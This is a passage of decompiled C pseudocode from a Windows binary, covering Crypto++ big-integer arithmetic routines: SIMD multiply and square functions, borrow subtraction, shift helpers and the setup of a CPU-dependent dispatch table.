  __m128i v130; // xmm5
  __m128i v131; // xmm6
  __m128i v132; // [esp+0h] [ebp-9Ch] BYREF
  __m128i v133; // [esp+10h] [ebp-8Ch] BYREF
  __m128i v134; // [esp+20h] [ebp-7Ch] BYREF
  __m128i v135; // [esp+30h] [ebp-6Ch] BYREF
  __m128i v136; // [esp+40h] [ebp-5Ch] BYREF
  __m128i v137; // [esp+50h] [ebp-4Ch]
  __m128i v138[3]; // [esp+60h] [ebp-3Ch]

  for ( i = 0; i != 32; i += 16 )
  {
    v3 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    *(__m128i *)((char *)&v133 + 2 * i) = v3;
    *(__m128i *)((char *)&v133 + 2 * i + 16) = _mm_srli_epi64(v3, 0x20u);
    *(__m128i *)((char *)&v137 + 2 * i) = v4;
    v138[i / 8] = _mm_srli_epi64(v4, 0x20u);
  }
  v5 = _mm_load_si128(&v133);
  v6 = _mm_mul_epu32(v5, v5);
  si128 = _mm_load_si128(&stru_4BACE0);
  v8 = _mm_and_si128(si128, v6);
  v9 = _mm_mul_epu32(v5, v137);
  v10 = _mm_and_si128(si128, v9);
  v11 = _mm_srli_epi32(v9, 0x10u);
  v12 = _mm_move_epi64(v10);
  v13 = _mm_move_epi64(v11);
  v14 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v10, v12), v12), 4);
  v15 = (__m128)_mm_add_epi32(v8, (__m128i)v14);
  v16 = (__m128i)_mm_movehl_ps(v14, v15);
  *(_DWORD *)a1 = _mm_cvtsi128_si32((__m128i)v15);
  v17 = (__m128)_mm_add_epi32(
                  _mm_srli_epi32(v6, 0x10u),
                  _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v11, v13), v13), 4));
  _mm_storeh_ps((double *)&v132.m128i_i64[1], v17);
  v18 = _mm_add_epi64(_mm_srli_epi64((__m128i)v15, 0x10u), (__m128i)v17);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v132.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v18, 0x30u), v16).m128i_u64[0];
  v19 = _mm_load_si128(&v134);
  v20 = _mm_mul_epu32(_mm_load_si128(&v133), v19);
  v21 = _mm_load_si128(&stru_4BACE0);
  v22 = _mm_and_si128(v21, v20);
  v23 = _mm_srli_epi32(v20, 0x10u);
  v24 = _mm_mul_epu32(v19, v137);
  v25 = _mm_and_si128(v21, v24);
  v26 = _mm_srli_epi32(v24, 0x10u);
  v27 = _mm_add_epi32(v25, v25);
  v28 = _mm_add_epi32(v26, v26);
  v29 = _mm_add_epi32(_mm_add_epi32(v23, v23), _mm_loadl_epi64((const __m128i *)&v132.m128i_i8[8]));
  v30 = _mm_move_epi64(v27);
  v31 = _mm_move_epi64(v28);
  v32 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v30), v30), 4);
  v33 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v22, v22), _mm_loadl_epi64(&v132)), (__m128i)v32);
  v34 = (__m128i)_mm_movehl_ps(v32, v33);
  *(_DWORD *)(a1 + 8) = _mm_cvtsi128_si32((__m128i)v33);
  v35 = (__m128)_mm_add_epi32(v29, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v31), v31), 4));
  _mm_storeh_ps((double *)&v132.m128i_i64[1], v35);
  v36 = _mm_add_epi64(_mm_srli_epi64((__m128i)v33, 0x10u), (__m128i)v35);
  *(_QWORD *)(a1 + 10) = v36.m128i_i64[0];
  v132.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v36, 0x30u), v34).m128i_u64[0];
  v37 = _mm_load_si128(&v135);
  v38 = _mm_mul_epu32(_mm_load_si128(&v133), v37);
  v39 = _mm_load_si128(&stru_4BACE0);
  v40 = _mm_and_si128(v39, v38);
  v41 = _mm_srli_epi32(v38, 0x10u);
  v42 = _mm_mul_epu32(v37, v137);
  v43 = _mm_load_si128(&v134);
  v44 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v134.m128i_i8[8]), v43);
  v45 = _mm_mul_epu32(v43, v43);
  v46 = v39;
  v47 = _mm_add_epi32(_mm_and_si128(v39, v42), _mm_and_si128(v39, v44));
  v48 = _mm_add_epi32(_mm_srli_epi32(v42, 0x10u), _mm_srli_epi32(v44, 0x10u));
  v49 = _mm_add_epi32(v47, v47);
  v50 = _mm_add_epi32(v48, v48);
  v51 = _mm_add_epi32(
          _mm_add_epi32(_mm_add_epi32(v41, v41), _mm_srli_epi32(v45, 0x10u)),
          _mm_loadl_epi64((const __m128i *)&v132.m128i_i8[8]));
  v52 = _mm_move_epi64(v49);
  v53 = _mm_move_epi64(v50);
  v54 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v49, v52), v52), 4);
  v55 = (__m128)_mm_add_epi32(
                  _mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v40, v40), _mm_and_si128(v46, v45)), _mm_loadl_epi64(&v132)),
                  (__m128i)v54);
  v56 = (__m128i)_mm_movehl_ps(v54, v55);
  *(_DWORD *)(a1 + 16) = _mm_cvtsi128_si32((__m128i)v55);
  v57 = (__m128)_mm_add_epi32(v51, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v50, v53), v53), 4));
  _mm_storeh_ps((double *)&v132.m128i_i64[1], v57);
  v58 = _mm_add_epi64(_mm_srli_epi64((__m128i)v55, 0x10u), (__m128i)v57);
  *(_QWORD *)(a1 + 18) = v58.m128i_i64[0];
  v132.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v58, 0x30u), v56).m128i_u64[0];
  v59 = _mm_load_si128(&v135);
  v60 = _mm_mul_epu32(_mm_load_si128(&v134), v59);
  v61 = _mm_load_si128(&stru_4BACE0);
  v62 = _mm_and_si128(v61, v60);
  v63 = _mm_srli_epi32(v60, 0x10u);
  v64 = _mm_mul_epu32(v59, v138[0]);
  v65 = _mm_and_si128(v61, v64);
  v66 = _mm_srli_epi32(v64, 0x10u);
  sub_44D34A((int)&v135, &v134);
  v68 = _mm_add_epi32(v65, v65);
  v69 = _mm_add_epi32(v66, v66);
  v70 = _mm_add_epi32(_mm_add_epi32(v63, v63), _mm_loadl_epi64((const __m128i *)&v132.m128i_i8[8]));
  v71 = _mm_move_epi64(v68);
  v72 = _mm_move_epi64(v69);
  v73 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v68, v71), v71), 4);
  v74 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v62, v62), _mm_loadl_epi64(&v132)), (__m128i)v73);
  v75 = (__m128i)_mm_movehl_ps(v73, v74);
  *(_DWORD *)(v76 + 24) = _mm_cvtsi128_si32((__m128i)v74);
  v77 = (__m128)_mm_add_epi32(v70, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v69, v72), v72), 4));
  _mm_storeh_ps((double *)&v132.m128i_i64[1], v77);
  v78 = _mm_add_epi64(_mm_srli_epi64((__m128i)v74, 0x10u), (__m128i)v77);
  *(_QWORD *)(v76 + 26) = v78.m128i_i64[0];
  v132.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v78, 0x30u), v75).m128i_u64[0];
  v79 = _mm_load_si128(&v136);
  v80 = _mm_mul_epu32(_mm_load_si128(&v134), v79);
  v81 = _mm_load_si128(&stru_4BACE0);
  v82 = _mm_and_si128(v81, v80);
  v83 = _mm_srli_epi32(v80, 0x10u);
  v85 = _mm_mul_epu32(v79, v84[-1]);
  v86 = _mm_load_si128(&v135);
  v87 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v135.m128i_i8[8]), v86);
  v88 = _mm_mul_epu32(v86, v86);
  v89 = v81;
  v90 = _mm_add_epi32(_mm_and_si128(v81, v85), _mm_and_si128(v81, v87));
  v91 = _mm_add_epi32(_mm_srli_epi32(v85, 0x10u), _mm_srli_epi32(v87, 0x10u));
  v92 = _mm_add_epi32(v90, v90);
  v93 = _mm_add_epi32(v91, v91);
  v94 = _mm_add_epi32(
          _mm_add_epi32(_mm_add_epi32(v83, v83), _mm_srli_epi32(v88, 0x10u)),
          _mm_loadl_epi64((const __m128i *)&v132.m128i_i8[8]));
  v95 = _mm_move_epi64(v92);
  v96 = _mm_move_epi64(v93);
  v97 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v92, v95), v95), 4);
  v98 = (__m128)_mm_add_epi32(
                  _mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v82, v82), _mm_and_si128(v89, v88)), _mm_loadl_epi64(&v132)),
                  (__m128i)v97);
  v99 = (__m128i)_mm_movehl_ps(v97, v98);
  *(_DWORD *)(v76 + 32) = _mm_cvtsi128_si32((__m128i)v98);
  v100 = (__m128)_mm_add_epi32(v94, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v93, v96), v96), 4));
  _mm_storeh_ps((double *)&v132.m128i_i64[1], v100);
  v101 = _mm_add_epi64(_mm_srli_epi64((__m128i)v98, 0x10u), (__m128i)v100);
  *(_QWORD *)(v76 + 34) = v101.m128i_i64[0];
  v132.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v101, 0x30u), v99).m128i_u64[0];
  ++v84;
  v102 = _mm_load_si128(&v136);
  v103 = _mm_mul_epu32(_mm_load_si128(&v135), v102);
  v104 = _mm_load_si128(&stru_4BACE0);
  v105 = _mm_and_si128(v104, v103);
  v106 = _mm_srli_epi32(v103, 0x10u);
  v107 = _mm_mul_epu32(v102, v84[-1]);
  v108 = _mm_and_si128(v104, v107);
  v109 = _mm_srli_epi32(v107, 0x10u);
  v110 = _mm_add_epi32(v108, v108);
  v111 = _mm_add_epi32(v109, v109);
  v112 = _mm_move_epi64(v110);
  v113 = _mm_move_epi64(v111);
  v114 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v105, v105), _mm_loadl_epi64(&v132)),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v110, v112), v112), 4));
  v115 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v106, v106), _mm_loadl_epi64((const __m128i *)&v132.m128i_i8[8])),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v111, v113), v113), 4));
  *(_DWORD *)(v76 + 40) = _mm_cvtsi128_si32(v114);
  v116 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v114), 0x10u), _mm_move_epi64(v115));
  v117 = _mm_unpackhi_epi64(v115, v112);
  *(_QWORD *)(v76 + 42) = v116.m128i_i64[0];
  v118 = _mm_add_epi32(_mm_unpackhi_epi64(v114, v112), _mm_srli_epi64(v116, 0x30u));
  v119 = _mm_load_si128(&v136);
  v120 = _mm_mul_epu32(v119, v119);
  v121 = _mm_mul_epu32(v119, *v84);
  v122 = _mm_load_si128(&stru_4BACE0);
  v123 = _mm_and_si128(v122, v120);
  v124 = _mm_add_epi32(v117, _mm_srli_epi32(v120, 0x10u));
  v125 = _mm_and_si128(v122, v121);
  v126 = _mm_srli_epi32(v121, 0x10u);
  v127 = _mm_move_epi64(v125);
  v128 = _mm_move_epi64(v126);
  v129 = _mm_add_epi32(
           _mm_add_epi32(v118, v123),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v125, v127), v127), 4));
  v130 = _mm_add_epi32(v124, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v126, v128), v128), 4));
  *(_DWORD *)(v76 + 48) = _mm_cvtsi128_si32(v129);
  v131 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v129), 0x10u), _mm_move_epi64(v130));
  *(_QWORD *)(v76 + 50) = v131.m128i_i64[0];
  *(_QWORD *)(v76 + 56) = _mm_add_epi64(
                            _mm_add_epi32(_mm_unpackhi_epi64(v129, v127), _mm_srli_epi64(v131, 0x30u)),
                            _mm_slli_epi64(_mm_unpackhi_epi64(v130, v127), 0x10u)).m128i_u64[0];
  return result;
}
// 44D5EE: variable 'v76' is possibly undefined
// 44D63B: variable 'v84' is possibly undefined
// 4BACE0: using guessed type __m128i stru_4BACE0;

//----- (0044D34A) --------------------------------------------------------
__m128i __usercall sub_44D34A@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 32)), _mm_load_si128(a2 + 2)), 0x10u);
}

//----- (0044D850) --------------------------------------------------------
int __fastcall sub_44D850(int a1, int a2, int a3, int a4)
{
  int v4; // eax
  int v5; // edi
  int v6; // edx
  int v7; // ecx
  __m64 v8; // mm2
  __m64 v9; // mm0
  __m64 v10; // mm2
  __m64 v11; // mm0
  __m64 v12; // mm2
  int result; // eax

  v4 = a3 + 4 * a1;
  v5 = a4 + 4 * a1;
  v6 = a2 + 4 * a1;
  v7 = -a1;
  v8.m64_u64 = 0i64;
  if ( v7 )
  {
    if ( (v7 & 2) == 0 )
      goto LABEL_4;
    v7 -= 2;
    while ( 1 )
    {
      v11 = _mm_sub_si64(
              _mm_sub_si64(
                _mm_cvtsi32_si64(*(_DWORD *)(v4 + 4 * v7 + 8)),
                _mm_cvtsi32_si64(*(_DWORD *)(v5 + 4 * v7 + 8))),
              v8);
      *(_DWORD *)(v6 + 4 * v7 + 8) = _mm_cvtsi64_si32(v11);
      v12 = _mm_sub_si64(
              _mm_sub_si64(
                _mm_cvtsi32_si64(*(_DWORD *)(v4 + 4 * v7 + 12)),
                _mm_cvtsi32_si64(*(_DWORD *)(v5 + 4 * v7 + 12))),
              _m_psrlqi(v11, 0x3Fu));
      *(_DWORD *)(v6 + 4 * v7 + 12) = _mm_cvtsi64_si32(v12);
      v8 = _m_psrlqi(v12, 0x3Fu);
      v7 += 4;
      if ( !v7 )
        break;
LABEL_4:
      v9 = _mm_sub_si64(
             _mm_sub_si64(_mm_cvtsi32_si64(*(_DWORD *)(v4 + 4 * v7)), _mm_cvtsi32_si64(*(_DWORD *)(v5 + 4 * v7))),
             v8);
      *(_DWORD *)(v6 + 4 * v7) = _mm_cvtsi64_si32(v9);
      v10 = _mm_sub_si64(
              _mm_sub_si64(
                _mm_cvtsi32_si64(*(_DWORD *)(v4 + 4 * v7 + 4)),
                _mm_cvtsi32_si64(*(_DWORD *)(v5 + 4 * v7 + 4))),
              _m_psrlqi(v9, 0x3Fu));
      *(_DWORD *)(v6 + 4 * v7 + 4) = _mm_cvtsi64_si32(v10);
      v8 = _m_psrlqi(v10, 0x3Fu);
    }
  }
  result = _mm_cvtsi64_si32(v8);
  _m_empty();
  return result;
}

//----- (0044D8F0) --------------------------------------------------------
char sub_44D8F0()
{
  char result; // al

  result = byte_4F0124;
  dword_4EEE4C = (int)sub_43F360;
  dword_4EEE70 = (int)sub_43FAC0;
  dword_4EEE94 = (int)sub_440430;
  dword_4EEEB8 = (int)sub_43FE50;
  dword_4EEEBC = (int)sub_43FEB0;
  if ( !byte_4F0124 )
  {
    sub_466590();
    result = byte_4F0124;
  }
  if ( byte_4F0125 )
  {
    if ( !result )
      result = sub_466590();
    if ( byte_4F012F )
    {
      off_4E802C[0] = (int (__stdcall *)(int, int))sub_444C50;
      off_4E8030 = (int (__stdcall *)(int, int))sub_44D850;
    }
    dword_4E8034 = 32;
    dword_4EEE50 = (int)sub_446DE0;
    dword_4EEE54 = (int)sub_447050;
    dword_4EEE5C = (int)sub_444CF0;
    dword_4EEE6C = (int)sub_4457B0;
    dword_4EEE74 = (int)sub_448AC0;
    dword_4EEE78 = (int)sub_448C20;
    dword_4EEE80 = (int)sub_447590;
    dword_4EEE90 = (int)sub_447C80;
    dword_4EEE98 = (int)sub_44D090;
    dword_4EEE9C = (int)sub_44D2C0;
    dword_4EEEA4 = (int)sub_44A990;
    dword_4EEEB4 = (int)sub_44B600;
    dword_4EEEC0 = (int)sub_44A590;
    dword_4EEEC8 = (int)sub_448F60;
    dword_4EEED8 = (int)sub_4496F0;
  }
  else
  {
    dword_4EEE50 = (int)sub_43F3C0;
    dword_4EEE54 = (int)sub_43F530;
    dword_4EEE74 = (int)sub_43FAF0;
    dword_4EEE78 = (int)sub_43FBA0;
    dword_4EEE98 = (int)sub_4404A0;
    dword_4EEE9C = (int)sub_440650;
    dword_4EEEC0 = (int)sub_440010;
  }
  return result;
}
// 4E802C: using guessed type int (__stdcall *off_4E802C[2])(int, int);
// 4E8030: using guessed type int (__stdcall *off_4E8030)(int, int);
// 4E8034: using guessed type int dword_4E8034;
// 4EEE4C: using guessed type int dword_4EEE4C;
// 4EEE50: using guessed type int dword_4EEE50;
// 4EEE54: using guessed type int dword_4EEE54;
// 4EEE5C: using guessed type int dword_4EEE5C;
// 4EEE6C: using guessed type int dword_4EEE6C;
// 4EEE70: using guessed type int dword_4EEE70;
// 4EEE74: using guessed type int dword_4EEE74;
// 4EEE78: using guessed type int dword_4EEE78;
// 4EEE80: using guessed type int dword_4EEE80;
// 4EEE90: using guessed type int dword_4EEE90;
// 4EEE94: using guessed type int dword_4EEE94;
// 4EEE98: using guessed type int dword_4EEE98;
// 4EEE9C: using guessed type int dword_4EEE9C;
// 4EEEA4: using guessed type int dword_4EEEA4;
// 4EEEB4: using guessed type int dword_4EEEB4;
// 4EEEB8: using guessed type int dword_4EEEB8;
// 4EEEBC: using guessed type int dword_4EEEBC;
// 4EEEC0: using guessed type int dword_4EEEC0;
// 4EEEC8: using guessed type int dword_4EEEC8;
// 4EEED8: using guessed type int dword_4EEED8;
// 4F0124: using guessed type char byte_4F0124;
// 4F0125: using guessed type char byte_4F0125;
// 4F012F: using guessed type char byte_4F012F;

//----- (0044DA50) --------------------------------------------------------
unsigned int __cdecl sub_44DA50(int a1, unsigned int a2, int a3)
{
  unsigned int result; // eax
  unsigned int i; // edi
  unsigned int v5; // esi

  result = 0;
  if ( a3 )
  {
    for ( i = 0; i < a2; result = v5 >> (32 - a3) )
    {
      v5 = *(_DWORD *)(a1 + 4 * i);
      *(_DWORD *)(a1 + 4 * i++) = result | (v5 << a3);
    }
  }
  return result;
}

//----- (0044DAA0) --------------------------------------------------------
int __cdecl sub_44DAA0(int a1, int a2, int a3)
{
  char v3; // bp
  int v4; // esi
  int v5; // edi
  unsigned int *v6; // ebx
  unsigned int v7; // edx
  char v9; // [esp+14h] [ebp+Ch]

  v3 = a3;
  v4 = 0;
  if ( !a3 )
    return 0;
  v5 = a2;
  if ( !a2 )
    return 0;
  v9 = 32 - a3;
  v6 = (unsigned int *)(a1 + 4 * (a2 - 1));
  do
  {
    v7 = *v6--;
    v6[1] = v4 | (v7 >> v3);
    v4 = v7 << v9;
    --v5;
  }
  while ( v5 );
  return v7 << v9;
}

//----- (0044DB00) --------------------------------------------------------
int __cdecl sub_44DB00(int a1, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // ebx
  int v4; // ecx
  _DWORD *v5; // edx
  unsigned int v6; // esi
  int result; // eax

  v3 = a3;
  if ( a2 < a3 )
    v3 = a2;
  if ( v3 )
  {
    if ( v3 < a2 )
    {
      v4 = a1;
      v5 = (_DWORD *)(a1 + 4 * v3);
      v6 = v3;
      do
      {
        v4 += 4;
        ++v6;
        *(_DWORD *)(v4 - 4) = *v5++;
      }
      while ( v6 < a2 );
    }
    result = 0;
    memset((void *)(a1 + 4 * (a2 - v3)), 0, 4 * v3);
  }
  return result;
}
// 44DB4F: conditional instruction was optimized away because ebx.4!=0

//----- (0044DB60) --------------------------------------------------------
void __thiscall sub_44DB60(int this, _DWORD *a2, _DWORD *a3, _DWORD *a4, unsigned int a5)
{
  _DWORD *v5; // eax
  unsigned int v6; // edx
  void *v7; // ebx
  int *v8; // esi
  char *v9; // ebx
  char *v10; // ecx
  unsigned int v11; // edx
  int v12; // eax
  unsigned int v13; // edx
  void *v14; // ebx
  _DWORD v15[6]; // [esp+10h] [ebp-A0h] BYREF
  unsigned int v16; // [esp+28h] [ebp-88h]
  int v17; // [esp+2Ch] [ebp-84h]
  _DWORD v18[21]; // [esp+34h] [ebp-7Ch] BYREF
  char *v19; // [esp+88h] [ebp-28h]
  _DWORD v20[2]; // [esp+8Ch] [ebp-24h] BYREF
  unsigned int v21; // [esp+94h] [ebp-1Ch]
  unsigned int v22; // [esp+98h] [ebp-18h]
  void *Block; // [esp+9Ch] [ebp-14h]
  int v24; // [esp+ACh] [ebp-4h]
  int v25; // [esp+B8h] [ebp+8h]
  void *v26; // [esp+C0h] [ebp+10h]

  if ( *(_DWORD *)(this + 24) && (**(_BYTE **)(this + 28) & 1) != 0 )
  {
    sub_43D720(v15, (_DWORD *)(this + 12));
    v24 = 0;
    v5 = sub_43B010(v15, v20, a3);
    LOBYTE(v24) = 1;
    sub_43BD20(v15, a2, v5, a4, a5);
    v6 = v22;
    v7 = Block;
    if ( v21 < v22 )
      v6 = v21;
    LOBYTE(v24) = 2;
    memset(Block, 0, 4 * v6);
    if ( v6 )
      j_j_unknown_libname_61(v7);
    else
      j_j___free_base(v7);
    LOBYTE(v24) = 0;
    if ( a5 )
    {
      v8 = a2 + 3;
      do
      {
        v9 = v19;
        v10 = (char *)v8[1];
        v11 = v16;
        v26 = (void *)v18[4];
        v12 = *v8;
        v25 = v16;
        if ( v19 != v10 )
        {
          sub_438F30(v19, 4 * v12, v10, 4 * v12);
          v12 = *v8;
          v11 = v25;
        }
        if ( 2 * v11 != v12 )
          memset(&v9[4 * v12], 0, 4 * (2 * v11 - v12));
        sub_4434C0(v26, (int)&v9[8 * v11], (int)v9, v17, v18[16], v11);
        sub_43D420(v20, v18);
        LOBYTE(v24) = 3;
        sub_43DBB0(v8 - 3, v20);
        v13 = v22;
        v14 = Block;
        if ( v21 < v22 )
          v13 = v21;
        LOBYTE(v24) = 4;
        memset(Block, 0, 4 * v13);
        if ( v13 )
          j_j_unknown_libname_61(v14);
        else
          j_j___free_base(v14);
        LOBYTE(v24) = 0;
        v8 += 6;
        --a5;
      }
      while ( a5 );
    }
    sub_439FE0((int)v15);
  }
  else
  {
    sub_43BD20((void *)this, a2, a3, a4, a5);
  }
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 44DB60: using guessed type _DWORD var_A0[6];
// 44DB60: using guessed type _DWORD var_24[2];

//----- (0044DD20) --------------------------------------------------------
_DWORD *__thiscall sub_44DD20(_DWORD *this, int a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // ebx
  unsigned int v5; // edx
  void *v6; // esi
  void **v8; // [esp+10h] [ebp-28h] BYREF
  unsigned int v9; // [esp+18h] [ebp-20h]
  unsigned int v10; // [esp+1Ch] [ebp-1Ch]
  void *Block; // [esp+20h] [ebp-18h]
  int v12; // [esp+24h] [ebp-14h]
  int v13; // [esp+28h] [ebp-10h]
  int v14; // [esp+34h] [ebp-4h]

  v13 = 0;
  v14 = 0;
  if ( !byte_4EEDFC )
  {
    sub_44D8F0();
    byte_4EEDFC = 1;
  }
  v8 = &CryptoPP::Integer::`vftable';
  v9 = 0x3FFFFFFF;
  v10 = 2;
  v3 = (_DWORD *)sub_41E7A0(2u, 0);
  Block = v3;
  v12 = 0;
  v13 = 2;
  v3[1] = 0;
  *v3 = 0;
  sub_444070((int)&v8, a2, a2);
  v14 = 1;
  v4 = sub_43DBB0(this + 9, &v8);
  v5 = v10;
  v6 = Block;
  if ( v9 < v10 )
    v5 = v9;
  v14 = 2;
  memset(Block, 0, 4 * v5);
  if ( v5 )
    j_j_unknown_libname_61(v6);
  else
    j_j___free_base(v6);
  return v4;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4EEDFC: using guessed type char byte_4EEDFC;

//----- (0044DE20) --------------------------------------------------------
_DWORD *__thiscall sub_44DE20(_DWORD *this, int a2)
{
  unsigned int v3; // edi
  int v4; // ebp
  int v5; // eax
  void *v7; // [esp+14h] [ebp-4h]

  v3 = this[6];
  v4 = this[30];
  v7 = (void *)this[13];
  sub_444AA0(v4, v4 + 8 * v3, *(_DWORD *)(a2 + 16), *(_DWORD *)(a2 + 12));
  v5 = *(_DWORD *)(a2 + 12);
  if ( 2 * (v3 - v5) )
    memset((void *)(v4 + 8 * v5), 0, 8 * (v3 - v5));
  sub_4434C0(v7, v4 + 8 * v3, v4, this[7], this[25], v3);
  return this + 9;
}

//----- (0044DEA0) --------------------------------------------------------
_DWORD *__thiscall sub_44DEA0(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  unsigned int v3; // ebx
  _DWORD *v4; // edx
  int v5; // eax
  _DWORD *v6; // ecx
  unsigned int v8; // eax
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  int v11; // ebx
  unsigned int v12; // edx
  void *v13; // esi
  unsigned int v14; // esi
  unsigned int v15; // eax
  _DWORD *v16; // eax
  _DWORD *v17; // eax
  unsigned int v18; // ebx
  unsigned int v19; // edx
  void *v20; // esi
  unsigned int v21; // edx
  void *v22; // esi
  unsigned int v23; // edx
  void *v24; // esi
  unsigned int v25; // edx
  void *v26; // esi
  int v27; // eax
  unsigned int v28; // edx
  void *v29; // esi
  unsigned int v30; // edx
  void *v31; // esi
  void ***v32; // [esp-8h] [ebp-54h]
  void ***v33; // [esp-4h] [ebp-50h]
  int v34; // [esp+10h] [ebp-3Ch] BYREF
  unsigned int v35; // [esp+18h] [ebp-34h]
  unsigned int v36; // [esp+1Ch] [ebp-30h]
  void *v37; // [esp+20h] [ebp-2Ch]
  _DWORD v38[2]; // [esp+28h] [ebp-24h] BYREF
  unsigned int v39; // [esp+30h] [ebp-1Ch]
  unsigned int v40; // [esp+34h] [ebp-18h]
  void *v41; // [esp+38h] [ebp-14h]
  int v42; // [esp+3Ch] [ebp-10h]
  int v43; // [esp+48h] [ebp-4h]
  _DWORD v44[2]; // [esp+4Ch] [ebp+0h] BYREF
  unsigned int v45; // [esp+54h] [ebp+8h]
  unsigned int v46; // [esp+58h] [ebp+Ch]
  void *v47; // [esp+5Ch] [ebp+10h]
  int v48; // [esp+60h] [ebp+14h]
  unsigned int v49; // [esp+64h] [ebp+18h]
  _DWORD *v50; // [esp+68h] [ebp+1Ch]
  void **v51; // [esp+6Ch] [ebp+20h] BYREF
  unsigned int v52; // [esp+74h] [ebp+28h]
  unsigned int v53; // [esp+78h] [ebp+2Ch]
  void *Block; // [esp+7Ch] [ebp+30h]
  int v55; // [esp+80h] [ebp+34h]
  void **v56; // [esp+84h] [ebp+38h] BYREF
  unsigned int v57; // [esp+8Ch] [ebp+40h]
  unsigned int v58; // [esp+90h] [ebp+44h]
  void *v59; // [esp+94h] [ebp+48h]
  int v60; // [esp+98h] [ebp+4Ch]
  _DWORD v61[2]; // [esp+9Ch] [ebp+50h] BYREF
  unsigned int v62; // [esp+A4h] [ebp+58h]
  unsigned int v63; // [esp+A8h] [ebp+5Ch]
  void *v64; // [esp+ACh] [ebp+60h]
  int v65; // [esp+B0h] [ebp+64h]
  _DWORD *v66; // [esp+B4h] [ebp+68h]
  unsigned int v67; // [esp+B8h] [ebp+6Ch]

  v2 = this;
  v66 = this;
  v3 = 0;
  v67 = 0;
  if ( this[5] == 1 )
    goto LABEL_7;
  v4 = (_DWORD *)this[4];
  if ( !*v4 )
  {
    v5 = this[3];
    if ( v5 )
    {
      v6 = &v4[v5 - 1];
      while ( !*v6 )
      {
        --v6;
        if ( !--v5 )
          goto LABEL_7;
      }
      goto LABEL_9;
    }
LABEL_7:
    sub_43D420(a2, &dword_4EEE04);
    return a2;
  }
LABEL_9:
  sub_43D6C0(v61);
  v43 = 1;
  v8 = sub_440BD0(v2);
  sub_4443D0((int)v38, (v8 + 1) >> 1);
  LOBYTE(v43) = 2;
  do
  {
    while ( 1 )
    {
      sub_43DBB0(v61, v38);
      LOBYTE(v43) = 3;
      if ( !byte_4EEDFC )
      {
        sub_44D8F0();
        byte_4EEDFC = 1;
      }
      v51 = &CryptoPP::Integer::`vftable';
      v52 = 0x3FFFFFFF;
      v53 = 2;
      v9 = (_DWORD *)sub_41E7A0(2u, 0);
      Block = v9;
      v55 = 0;
      v9[1] = 0;
      *v9 = 0;
      v43 = 4;
      if ( !byte_4EEDFC )
      {
        sub_44D8F0();
        byte_4EEDFC = 1;
      }
      v56 = &CryptoPP::Integer::`vftable';
      v57 = 0x3FFFFFFF;
      v58 = 2;
      v10 = (_DWORD *)sub_41E7A0(2u, 0);
      v59 = v10;
      v11 = v3 | 4;
      v60 = 0;
      v67 = v11;
      v10[1] = 0;
      *v10 = 0;
      sub_441740(&v51, &v56, v2, v61);
      v12 = v53;
      v13 = Block;
      if ( v52 < v53 )
        v12 = v52;
      v43 = 5;
      memset(Block, 0, 4 * v12);
      if ( v12 )
        j_j_unknown_libname_61(v13);
      else
        j_j___free_base(v13);
      v43 = 2;
      v14 = v11 & 0xFFFFFFFB;
      v67 = v11 & 0xFFFFFFF9 | 2;
      v15 = v63;
      v49 = v58;
      if ( v63 < v58 )
        v15 = v58;
      LOBYTE(v43) = 7;
      sub_43D360(v44, 0, v15);
      v67 = v11 & 0xFFFFFFE9 | 0x12;
      if ( v65 != 1 )
      {
        v33 = &v56;
        v32 = (void ***)v61;
        if ( v60 != 1 )
        {
          sub_443D00((int)v44, (int)v61, (int)&v56);
          goto LABEL_28;
        }
        goto LABEL_26;
      }
      if ( v60 != 1 )
      {
        v33 = (void ***)v61;
        v32 = &v56;
LABEL_26:
        sub_444260((int)v44, (int)v32, (int)v33);
        goto LABEL_28;
      }
      sub_443D00((int)v44, (int)v61, (int)&v56);
      v48 = 1;
LABEL_28:
      v43 = 9;
      v67 = v11 & 0xFFFFFFE1 | 0xA;
      v16 = sub_43D420(&v51, v44);
